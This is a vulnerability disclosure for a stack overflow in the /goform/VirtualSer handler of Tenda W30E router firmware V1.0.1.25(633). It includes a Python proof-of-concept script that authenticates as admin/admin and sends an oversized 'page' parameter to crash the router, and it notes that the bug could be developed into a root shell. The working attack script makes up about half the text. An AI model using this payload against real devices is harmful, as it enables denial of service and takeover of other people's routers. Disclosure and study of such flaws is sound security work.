# Tenda W30E V1.0.1.25(633) Stack overflow vulnerability

## Firmware information

- Manufacturer's address：https://www.tenda.com.cn/

- Firmware download address ： https://www.tenda.com.cn/download/detail-2218.html


## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/W30E/exeCommand/img/1.png)

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/W30E/VirtualSer/img/2.png)

In /goform/VirtualSer, the page will be spliced into s by sprintf. It is worth noting that there is no size check, which leads to a stack overflow vulnerability.

## Poc

```python
import requests

cmd = b'page=' + b'a' * 0x3000

url = b"http://192.168.10.103/login/Auth"
payload = b"http://192.168.10.103/goform/VirtualSer/?" + cmd

data = {
    "username": "admin",
    "password": "admin",
}

def attack():
    s = requests.session()
    resp = s.post(url=url, data=data)
    print(resp.content)
    resp = s.post(url=payload, data=data)
    print(resp.content)

attack()
```

You can see that the router crashed, and finally you can write an exp to get a root shell
